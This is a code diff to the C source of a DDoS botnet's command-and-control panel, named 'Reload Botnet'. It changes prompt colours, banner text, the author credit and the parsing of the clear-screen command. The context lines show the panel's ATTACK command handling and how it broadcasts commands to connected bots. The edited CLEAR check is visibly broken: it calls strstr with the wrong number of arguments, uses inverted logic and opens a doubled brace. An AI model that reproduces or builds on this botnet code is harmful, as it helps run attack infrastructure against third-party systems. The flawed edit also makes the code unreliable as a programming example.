@@ -149,7 +149,7 @@ void broadcast(char *msg, int us, char *sender)
                         send(i, ": ", 2, MSG_NOSIGNAL); 
                 }
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\n\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -417,12 +417,14 @@ void *telnetWorker(void *sock) {
         	sprintf(banner1, "                \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
 		sprintf(banner2, "                \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
 		sprintf(banner3, "                \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
+                sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
+                sprintf(banner9, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
         	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
-		if(send(thefd, "\r\n\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
         pthread_create(&title, NULL, &titleWriter, sock);
@@ -462,7 +464,7 @@ if(strstr(buf, "ATTACK")) {
 				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
-				if(send(thefd, "\r\n\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 44, MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 44, MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
 				continue;
@@ -530,12 +532,14 @@ if(strstr(buf, "ATTACK")) {
         fclose(logFile);
 		goto end;
    	   	}
-        if (strstr(buf, "CLEAR"))
+        if (strstr(buf, "CLEAR", 5) == 0 || strstr(buf, "clear", 5) == 0 || strstr(buf, "cls", 3) == 0 || strstr(buf, "CLS", 3) == 0) {
         { 
           if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
         	sprintf(banner1, "                \e[38;2;89;255;0m╦═╗╔═╗╦ \e[38;2;0;229;255m ╔═╗╔═╗╔╦╗\r\n");
 		sprintf(banner2, "                \e[38;2;89;255;0m╠╦╝║╣ ║ \e[38;2;0;229;255m ║ ║╠═╣ ║║\r\n");
 		sprintf(banner3, "                \e[38;2;89;255;0m╩╚═╚═╝╩═╝\e[38;2;0;229;255m╚═╝╩ ╩═╩╝\r\n");
+                sprintf(banner4, "                        \e[38;2;89;255;0mType '\e[38;2;0;229;255mHELP\e[38;2;89;255;0m' to see all commands\r\n");
+                sprintf(banner9, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
         	if(send(thefd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
@@ -546,7 +550,7 @@ if(strstr(buf, "ATTACK")) {
             goto end;
          }
                 trim(buf);
-                sprintf(botnet, "\r\n\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m");
+                sprintf(botnet, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m");
                 if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                 if(strlen(buf) == 0) continue;
                 printf("%s: \"%s\"\n",accounts[find_line].id, buf);
@@ -615,7 +619,7 @@ int main (int argc, char *argv[], void *sock)
         {
             printf("Good Choice in Threading\n");
         }
-        printf("Reload Botnet.\nCreated by UsericMods.\r\n");
+        printf("Reload Botnet.\nCreated by Reload.\r\n");
         listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
         if (listenFD == -1) abort();
  
